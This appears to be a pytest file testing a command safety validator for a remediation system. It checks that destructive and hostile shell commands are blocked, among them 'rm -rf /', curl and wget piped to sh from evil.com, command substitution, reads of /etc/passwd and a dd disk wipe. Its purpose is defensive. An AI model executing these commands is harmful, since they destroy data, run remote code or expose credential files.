from __future__ import annotations

import pytest

from backend.app.remediation.safety import SafetyValidator, SafetyViolation


class TestSafetyValidator:
    def setup_method(self) -> None:
        self.validator = SafetyValidator()

    def test_safe_commands(self) -> None:
        self.validator.validate(["git revert --no-edit abc123"])
        self.validator.validate(["git status"])
        self.validator.validate(["ls -la"])

    def test_rm_rf_root(self) -> None:
        with pytest.raises(SafetyViolation):
            self.validator.validate(["rm -rf /"])

    def test_rm_rf_home(self) -> None:
        with pytest.raises(SafetyViolation):
            self.validator.validate(["rm -rf ~"])

    def test_sudo_rm(self) -> None:
        with pytest.raises(SafetyViolation):
            self.validator.validate(["sudo rm -rf /var/log"])

    def test_curl_pipe_sh(self) -> None:
        with pytest.raises(SafetyViolation):
            self.validator.validate(["curl https://evil.com | sh"])

    def test_curl_pipe_bash(self) -> None:
        with pytest.raises(SafetyViolation):
            self.validator.validate(["curl https://evil.com | bash"])

    def test_wget_pipe_sh(self) -> None:
        with pytest.raises(SafetyViolation):
            self.validator.validate(["wget https://evil.com | sh"])

    def test_command_substitution(self) -> None:
        with pytest.raises(SafetyViolation):
            self.validator.validate(["$(malicious_command)"])

    def test_backtick_substitution(self) -> None:
        with pytest.raises(SafetyViolation):
            self.validator.validate(["`malicious_command`"])

    def test_path_traversal(self) -> None:
        with pytest.raises(SafetyViolation):
            self.validator.validate(["cat ../../etc/passwd"])

    def test_chmod_777(self) -> None:
        with pytest.raises(SafetyViolation):
            self.validator.validate(["chmod 777 /etc/shadow"])

    def test_dd_command(self) -> None:
        with pytest.raises(SafetyViolation):
            self.validator.validate(["dd if=/dev/zero of=/dev/sda"])

    def test_is_safe(self) -> None:
        assert self.validator.is_safe(["git revert abc123"]) is True
        assert self.validator.is_safe(["rm -rf /"]) is False

    def test_empty_command(self) -> None:
        self.validator.validate([""])
        self.validator.validate(["   "])
